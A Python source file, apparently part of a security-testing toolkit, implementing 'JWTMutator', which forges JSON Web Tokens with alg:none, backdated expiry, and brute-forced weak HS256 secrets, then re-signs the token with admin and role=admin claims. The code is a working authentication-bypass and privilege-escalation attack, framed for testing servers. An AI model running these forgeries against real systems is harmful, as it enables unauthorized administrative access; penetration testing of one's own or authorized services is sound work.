# Copyright (c) 2026 M. TENDENG
# Licensed under the MIT License. See LICENSE file for details.

"""
JWTMutator: forge des tokens JWT manipulés pour les tests de sécurité.

Ne nécessite aucune bibliothèque externe — implémente uniquement HS256 et alg:none.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import time


def _b64url_decode(s: str) -> bytes:
    s += "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)


def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def decode_jwt_insecure(token: str) -> tuple[dict, dict, str] | None:
    """Décode un JWT sans vérifier la signature. Retourne (header, payload, sig_b64) ou None."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return header, payload, parts[2]
    except Exception:  # noqa: BLE001
        return None


def forge_alg_none(token: str) -> str | None:
    """
    Crée un JWT avec alg:none et sans signature.
    Si le serveur accepte ce token, il ne vérifie pas l'algorithme.
    """
    decoded = decode_jwt_insecure(token)
    if decoded is None:
        return None
    header, payload, _ = decoded
    header["alg"] = "none"
    new_header = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    new_payload = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{new_header}.{new_payload}."


def forge_expired(token: str, seconds_ago: int = 86400) -> str | None:
    """
    Crée un JWT dont exp est dans le passé.
    Si le serveur accepte ce token, il ne vérifie pas l'expiration.
    La signature originale est conservée (invalide, mais teste si exp est vérifié en premier).
    """
    decoded = decode_jwt_insecure(token)
    if decoded is None:
        return None
    _header, payload, sig = decoded
    payload["exp"] = int(time.time()) - seconds_ago
    payload["iat"] = payload.get("iat", int(time.time()) - seconds_ago - 60)
    orig_parts = token.split(".")
    new_payload = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{orig_parts[0]}.{new_payload}.{sig}"


WEAK_SECRETS = [
    "secret", "password", "key", "jwt", "token",
    "12345", "123456", "qwerty", "admin", "test",
    "", "null", "none", "changeme", "mysecret",
    "supersecret", "your-256-bit-secret",
]


def try_weak_secrets(token: str) -> str | None:
    """
    Essaie de re-signer le JWT avec des secrets communs (HS256 uniquement).
    Si un secret faible est trouvé, retourne un token re-signé avec admin=true.
    Retourne None si aucun secret ne correspond ou si alg != HS256.
    """
    decoded = decode_jwt_insecure(token)
    if decoded is None:
        return None
    header, payload, original_sig = decoded

    if header.get("alg", "").upper() != "HS256":
        return None

    orig_parts = token.split(".")
    message = f"{orig_parts[0]}.{orig_parts[1]}".encode()

    for secret in WEAK_SECRETS:
        computed_sig = hmac.new(secret.encode(), message, hashlib.sha256).digest()
        computed_b64 = _b64url_encode(computed_sig)
        if computed_b64 == original_sig:
            payload_mod = dict(payload)
            payload_mod["admin"] = True
            payload_mod["role"] = "admin"
            new_payload = _b64url_encode(json.dumps(payload_mod, separators=(",", ":")).encode())
            new_message = f"{orig_parts[0]}.{new_payload}".encode()
            new_sig = hmac.new(secret.encode(), new_message, hashlib.sha256).digest()
            return f"{orig_parts[0]}.{new_payload}.{_b64url_encode(new_sig)}"
    return None
